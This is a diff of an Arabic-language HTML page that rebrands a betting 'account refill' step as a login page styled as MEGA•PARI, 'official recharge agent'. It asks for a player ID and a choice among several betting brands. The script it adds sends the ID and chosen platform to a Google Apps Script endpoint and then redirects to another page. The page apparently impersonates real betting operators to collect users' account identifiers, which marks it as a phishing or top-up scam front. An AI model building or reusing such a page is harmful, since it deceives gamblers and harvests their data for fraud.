@@ -3,63 +3,77 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>إعادة تعبئة الحساب</title>
+  <title>تسجيل الدخول</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet" />
   <style>
     :root {
       --header-height: 60px;
-      --idbet-color: #e50914;
+      --megapari-red: #ed1c24;
+      --megapari-blue: #009ddf;
+      --dark-gray-bg: #2c2c2c;
     }
+
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
+
     body {
       font-family: 'Tajawal', sans-serif;
-      background: #f5f5f5;
-      color: #333;
+      background: var(--megapari-blue);
+      color: #fff;
     }
+
     header {
       height: var(--header-height);
-      background: #fff;
+      background: var(--dark-gray-bg);
       display: flex;
       align-items: center;
       padding: 0 16px;
       box-shadow: 0 1px 4px rgba(0, 0, 0, .05);
-      border-bottom: 1px solid #eee;
+      border-bottom: 1px solid #444;
+      color: #fff;
     }
+
     .header-brand {
       display: flex;
       align-items: center;
       gap: 8px;
       font-weight: 500;
     }
+
     .idbet {
-      color: var(--idbet-color);
+      color: var(--megapari-red);
       font-size: 1.1rem;
       font-weight: bold;
     }
+
     .separator {
       color: #ccc;
     }
+
     .slogan {
-      color: #555;
+      color: #ddd;
       font-size: .9rem;
     }
+
     main {
       display: flex;
       justify-content: center;
       padding: 24px 12px;
     }
+
     .login-box {
       background: #fff;
+      color: #000;
       padding: 28px 20px;
-      max-width: 440px;
+      max-width: 400px;
       width: 100%;
       border-radius: 14px;
       box-shadow: 0 6px 20px rgba(0, 0, 0, .06);
     }
+
     .title-wrapper {
       display: flex;
       align-items: center;
@@ -69,10 +83,11 @@
       margin-bottom: 16px;
       color: #222;
     }
+
     .step-box {
       width: 32px;
       height: 32px;
-      background: var(--idbet-color);
+      background: var(--megapari-red);
       color: #fff;
       border-radius: 50%;
       display: flex;
@@ -80,47 +95,105 @@
       justify-content: center;
       font-size: 0.9rem;
     }
-    .account-section {
+
+    .input-label {
+      margin-bottom: 6px;
+      font-weight: 600;
       display: flex;
-      justify-content: space-between;
       align-items: center;
-      gap: 12px;
-      background: #f9f9f9;
-      padding: 10px 14px;
-      border-radius: 8px;
-      border: 1px solid #ddd;
-      margin-bottom: 20px;
-      font-size: 0.95rem;
-      color: #333;
-    }
-    .account-id {
-      font-weight: bold;
-      user-select: all;
-    }
-    .account-text {
-      text-align: left;
-      font-size: 0.9rem;
-      color: #666;
+      gap: 4px;
     }
 
-    /* أيقونات المنصات */
+    .info-icon {
+      width: 20px;
+      height: 20px;
+      border: 2px solid #666;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.95rem;
+      cursor: help;
+      color: #666;
+      transition: all 0.3s ease;
+    }
+
+    .info-icon:hover {
+      border-color: var(--megapari-red);
+      background: rgba(237, 28, 36, 0.08);
+      color: var(--megapari-red);
+    }
+
+    .input-group {
+      margin-bottom: 12px;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-wrapper input {
+      width: 100%;
+      padding: 8px;
+      font-size: 0.95rem;
+      border: 1px solid #bbb;
+      border-radius: 6px;
+      outline: none;
+      padding-left: 40px;
+    }
+
+    .status-icon {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      display: none;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .status-spinner {
+      border: 2px solid #ccc;
+      border-top: 2px solid var(--megapari-red);
+      animation: spin 0.8s linear infinite;
+    }
+
+    .status-check {
+      background: #28a745;
+      color: white;
+      font-size: 12px;
+    }
+
+    .error-message {
+      font-size: 0.8rem;
+      margin-top: 4px;
+      min-height: 18px;
+      text-align: center;
+      color: #d32f2f;
+    }
+
     .platform-icons {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 16px;
-      width: 100%;
+      gap: 12px;
+      margin: 16px 0 18px;
     }
 
     .icon {
-      height: 120px;
+      position: relative;
+      width: 85px;
+      height: 85px;
       border-radius: 12px;
       background: #fff;
       box-shadow: 0 2px 8px rgba(0, 0, 0, .04);
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: space-between;
-      padding: 10px;
+      justify-content: center;
+      padding: 8px;
       border: 1px solid #eee;
       cursor: pointer;
       transition: all 0.3s ease;
@@ -132,18 +205,18 @@
     }
 
     .icon.selected {
-      border-color: var(--idbet-color);
-      box-shadow: 0 0 8px rgba(229, 9, 20, .3);
+      border-color: var(--megapari-red);
+      box-shadow: 0 0 8px rgba(237, 28, 36, .3);
     }
 
     .icon.selected::after {
       content: "✓";
       position: absolute;
-      top: 8px;
-      left: 8px;
+      top: 5px;
+      left: 5px;
       width: 18px;
       height: 18px;
-      background: var(--idbet-color);
+      background: var(--megapari-red);
       color: #fff;
       border-radius: 50%;
       font-size: 11px;
@@ -153,21 +226,58 @@
     }
 
     .icon img {
-      max-height: 50%;
-      max-width: 100%;
+      height: 40px;
+      max-width: 80%;
       object-fit: contain;
     }
 
     .icon-name {
-      height: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.9rem;
+      margin-top: 6px;
+      font-size: 0.8rem;
       color: #222;
-      font-weight: 600;
       text-align: center;
+    }
+
+    .login-btn {
+      background: var(--megapari-red);
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      padding: 10px 12px;
       width: 100%;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      font-size: 1rem;
+    }
+
+    .login-btn:disabled {
+      background: #ccc;
+      cursor: not-allowed;
+    }
+
+    .login-btn:hover:not(:disabled) {
+      background: #c3141b;
+    }
+
+    .login-btn:active:not(:disabled) {
+      transform: scale(0.98);
+    }
+
+    .btn-spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, .6);
+      border-top: 2px solid #fff;
+      border-radius: 50%;
+      display: inline-block;
+      animation: spin 0.8s linear infinite;
+      margin-right: 5px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
@@ -175,49 +285,133 @@
 
 <header>
   <div class="header-brand">
-    <span class="idbet">idbet</span><span class="separator">|</span><span class="slogan">وكيل الشحن الرسمي</span>
+    <span class="idbet">MEGA•PARI</span><span class="separator">|</span><span class="slogan">وكيل الشحن الرسمي</span>
   </div>
 </header>
 
 <main>
   <section class="login-box">
-    <!-- العنوان والخطوة -->
-    <div class="title-wrapper">
-      <div class="step-box">2</div>
-      <h2>إعادة تعبئة الحساب</h2>
+    <div class="title-wrapper"><div class="step-box">1</div><h2>تسجيل الدخول</h2></div>
+
+    <div class="input-label">
+      <label for="player-id-1">معرّف اللاعب</label>
+      <span class="info-icon" title="رقم مكوَّن من 10 أرقام">?</span>
     </div>
 
-    <!-- رقم الحساب + الجملة بشكل أفقي -->
-    <div class="account-section">
-      <div class="account-id">رقم الحساب: <span id="account-number">1318192563</span></div>
-      <div class="account-text">حدد نظام الدفع الذي تُريد شحن حسابك من خلاله.</div>
+    <div class="input-group">
+      <div class="input-wrapper">
+        <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="10" />
+        <div class="status-icon" id="status-icon"></div>
+      </div>
+      <div class="error-message" id="error-message"></div>
     </div>
 
-    <!-- المنصات -->
     <div class="platform-icons" id="platforms">
-      <div class="icon" data-name="LineBet">
-        <img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" alt="LineBet" />
-        <div class="icon-name">LineBet</div>
-      </div>
-      <div class="icon" data-name="MegaPari">
-        <img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" alt="MegaPari" />
-        <div class="icon-name">MegaPari</div>
-      </div>
-      <div class="icon" data-name="Melbet">
-        <img src="https://i.postimg.cc/wjCr86FS/melbet.png" alt="Melbet" />
-        <div class="icon-name">Melbet</div>
-      </div>
-      <div class="icon" data-name="Gooobet">
-        <img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" alt="Gooobet" />
-        <div class="icon-name">Gooobet</div>
-      </div>
-      <div class="icon" data-name="1xBet">
-        <img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" alt="1xBet" />
-        <div class="icon-name">1xBet</div>
-      </div>
+      <div class="icon" data-name="LineBet"><img src="https://i.postimg.cc/x1p0KbfL/cropped-linebet-logo.png" /><div class="icon-name">LineBet</div></div>
+      <div class="icon" data-name="MegaPari"><img src="https://i.postimg.cc/3RRJsCtS/Wh7-Gu-Bom34-Xq4-Bu-QN5n-Qlj-XPXf-V6-CZothm-Lsl6a-S.webp" /><div class="icon-name">MegaPari</div></div>
+      <div class="icon" data-name="Melbet"><img src="https://i.postimg.cc/wjCr86FS/melbet.png" /><div class="icon-name">Melbet</div></div>
+      <div class="icon" data-name="Gooobet"><img src="https://i.postimg.cc/NMyXmrWn/c943dc665c7e8926e8fb15cadd4e1eee.jpg" /><div class="icon-name">Gooobet</div></div>
+      <div class="icon" data-name="1xBet"><img src="https://i.postimg.cc/PrMCL4Cx/1-XBet-Casino-1200x900-1.png" /><div class="icon-name">1xBet</div></div>
     </div>
+
+    <button class="login-btn" id="login-btn" disabled>تسجيل الدخول</button>
   </section>
 </main>
+
+<script>
+  const input = document.getElementById('player-id-1');
+  const errMsg = document.getElementById('error-message');
+  const btn = document.getElementById('login-btn');
+  const icons = document.querySelectorAll('.icon');
+  const statusIcon = document.getElementById('status-icon');
+  let platform = null;
+  const repReg = /^(\d)\1{9}$/;
+
+  input.addEventListener('keydown', e => {
+    const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
+    if (!ok.includes(e.key) && !/^\d$/.test(e.key)) e.preventDefault();
+  });
+
+  input.addEventListener('input', validate);
+
+  icons.forEach(icon => {
+    icon.addEventListener('click', () => {
+      icons.forEach(i => i.classList.remove('selected'));
+      icon.classList.add('selected');
+      platform = icon.dataset.name;
+      validate();
+    });
+  });
+
+  function validate() {
+    const val = input.value.replace(/\D/g, '');
+    input.value = val;
+    errMsg.textContent = '';
+    btn.disabled = true;
+
+    if (val.length < 10) {
+      statusIcon.style.display = 'none';
+      statusIcon.className = 'status-icon';
+      statusIcon.innerHTML = '';
+      return;
+    }
+
+    statusIcon.style.display = 'flex';
+    statusIcon.className = 'status-icon status-spinner';
+    statusIcon.innerHTML = '';
+
+    setTimeout(() => {
+      if (repReg.test(val)) {
+        errMsg.textContent = 'المعرّف غير صالح';
+        statusIcon.style.display = 'none';
+        return;
+      }
+      if (!platform) {
+        errMsg.textContent = 'يرجى اختيار المنصة.';
+        statusIcon.style.display = 'none';
+        return;
+      }
+
+      btn.disabled = false;
+      statusIcon.className = 'status-icon status-check';
+      statusIcon.innerHTML = '✓';
+    }, 500);
+  }
+
+  btn.addEventListener('click', async () => {
+    btn.innerHTML = '<span class="btn-spinner"></span> جارٍ التحقق...';
+    btn.disabled = true;
+    const payload = { userId: input.value, platform: platform };
+    try {
+      await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      setTimeout(() => {
+        localStorage.setItem('userId', input.value);
+        window.location.href = 'home.html';
+      }, 1200);
+    } catch (err) {
+      errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
+      btn.innerHTML = 'تأكيد';
+      btn.disabled = false;
+    }
+  });
+
+  window.addEventListener('pageshow', () => {
+    btn.disabled = true;
+    btn.innerHTML = 'تأكيد';
+    errMsg.textContent = '';
+    input.value = '';
+    platform = null;
+    statusIcon.style.display = 'none';
+    statusIcon.className = 'status-icon';
+    statusIcon.innerHTML = '';
+    icons.forEach(i => i.classList.remove('selected'));
+  });
+</script>
 
 </body>
 </html>
